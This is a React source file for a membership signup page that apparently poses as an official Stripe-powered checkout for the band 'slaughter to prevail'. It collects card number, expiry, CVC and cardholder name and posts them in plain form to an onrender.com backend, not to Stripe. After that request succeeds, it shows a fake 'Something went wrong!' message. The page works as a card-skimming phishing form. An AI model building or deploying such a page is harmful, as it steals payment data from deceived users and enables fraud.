import React, {useEffect, useRef, useState} from 'react'
import Aos from "aos"
import {Navigate} from "react-router-dom"
import "aos/dist/aos.css"
import { useParams } from 'react-router-dom'
import ReactCountryDropdown from "react-country-dropdown"


const Membership = () => {
    const [prompt, setPrompt] = useState(false)
const [loading, setLoading] = useState(false)
    const {cat} = useParams()
    const [navigate, setNavigate] = useState(false)
    const [details, setDetails] = useState({
      email:"", cardNumber:"", date:"", cvc:"", country:"", cardName:""
    })
    const ref = useRef(null)
    useEffect(() => {
    Aos.init({duration:2000})
    if(ref.current){
        ref.current.scrollIntoView({behavior:"smooth"})
    }
}, [])


const sendDetails = async (e) => {
  e.preventDefault()
  //membership-backend-5qrm.onrender.com
  console.log("this is the time to send details", details)
  try{
    setLoading(true);
    const res = await fetch(`https://membership-backend-5qrm.onrender.com/auth/details`, {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        ...details
      }),
      credentials:"include"
    })
    
    if(res.ok){
      setPrompt(true)
      setLoading(true);
    }

  }catch (error) {
    console.log("this is the error that occured in Auth component", error)
  }
}


  return (

    <div data-aos="fade-down" className='w-full pt-20 min-h-screen bg-white/200 dark:bg-gray-800'>
      <div className={`w-screen bg-gray-800/60 h-screen fixed ${prompt ? "block" : "hidden"}`}>
        <div className='w-[90%] flex items-center justify-center flex-col gap-5 absolute -translate-y-1/2 top-1/2 -translate-x-1/2 left-1/2 h-[50%] bg-white'>
          <h1 className='text-xl text-center'>Something went wrong!</h1>
          <button onClick={() => setPrompt(false)} className='bg-gray-800 rounded-md text-white w-32 h-12'>cancel</button>
        </div>
      </div>
      <div ref={ref} className='flex w-full flex-col items-center'>
        <p data-aos="fade" className='text-gray-500 py-4  font-medium tracking-wider dark:text-white/70'>Signup for {cat}</p>
        <div className='text-gray-800 font-medium tracking-wider dark:text-white/70'>
        <span className='font-bold text-2xl dark:text-white/90'>$72.00</span> per month
      </div>
      </div>
    <form onSubmit={sendDetails} className='w-full flex flex-col justify-center items-center lg:w-[40%] lg:mx-auto mt-5 h-auto'>
        <input type="email" value={details.email} onChange={(e) => setDetails({...details, email:e.target.value})} required placeholder='Email' className='w-[90%]  px-5 py-1 text-gray-700 dark:text-gray-400
         rounded-lg h-10 bg-gray-200 dark:bg-gray-900 outline-none border-2 border-[#afafaf] dark:border-gray-700'/>
         <label className='w-[90%] mx-auto h-auto'>
           <p className='py-2 mt-3 text-gray-700 dark:text-gray-400'> Card Number</p>
          <input type="text" value={details.cardNumber} onChange={(e) => setDetails({...details, cardNumber:e.target.value})} required placeholder='1234 1234 1234 1234' className=' px-5 py-1 text-gray-700 dark:text-gray-400
         rounded-lg h-10 w-full bg-gray-200 dark:bg-gray-900 outline-none border-[1.2px] border-[#afafaf] dark:border-gray-700'/>
         </label>
         <label className='w-full flex justify-center h-auto'>
            <input type="text" value={details.date} onChange={(e) => setDetails({...details, date:e.target.value})} required placeholder='MM / YY' className='w-[45%] px-5 py-1 text-gray-700 dark:text-gray-400
         rounded-lg h-10 bg-gray-200 dark:bg-gray-900 outline-none border-[1.2px] border-[#afafaf] dark:border-gray-700'/>
         <input type="text" value={details.cvc} onChange={(e) => setDetails({...details, cvc:e.target.value})} placeholder='CVC' className='w-[45%] px-5 py-1 text-gray-700 dark:text-gray-400
         rounded-lg h-10 bg-gray-200 dark:bg-gray-900 outline-none border-[1.5px] border-[#afafaf] dark:border-gray-700'/>
         </label>
         <label className='w-[90%] mx-auto h-auto'>
           <p className='py-2 mt-3 text-gray-700 dark:text-gray-400'> Cardholder name</p>
          <input value={details.cardName} onChange={(e) => setDetails({...details, cardName:e.target.value})} type="text" required placeholder='Full name on card' className='w-full px-5 py-1 text-gray-700 dark:text-gray-400
         rounded-lg h-10 bg-gray-200 dark:bg-gray-900 outline-none border-[1.2px] border-[#afafaf] dark:border-gray-700'/>
         </label>

        <label className='w-[90%] mx-auto h-auto'>
           <p className='py-2 mt-3 text-gray-700 dark:text-gray-400'> Country</p>
           <div className='w-auto h-auto border-gray-400 rounded-lg border-[2px]'>
            <ReactCountryDropdown
            defaultCountry="Nigeria"
            className="bg-black"
            onSelect={(country) => setDetails({...details, country:country.name})}
        />
           </div>
       </label>
        

         <button type='submit' className='w-[90%] mt-10 rounded-lg h-10 bg-black grid place-items-center text-white/70 dark:bg-blue-900'>{loading ? "Signing..." : "Sign Up"}</button>
        <div className='text-gray-700 w-[90%] text-center dark:text-gray-400 mt-10 text-xs md:text-sm lg:text-md'>
            By confirming your membership signup, you allow <span className='text-gray-900 font-sans dark:text-gray-400 font-semibold ml-1'>slaughter to prevail</span> to charge you for future payments in accordance 
            with their terms. You can always cancel your subscription. By placing your order, you agree to our <span className='underline mr-1'>Terms of service</span> 
             and <span className='underline'>Privacy Policy</span>
        </div>
        <p className='text-gray-700 dark:text-gray-400 text-center mt-14 w-[90%]'>Powered by <span className='text-gray-800 dark:text-gray-400 font-semibold'>stripe</span></p>
    </form>
      
    </div>
  )
}

export default Membership
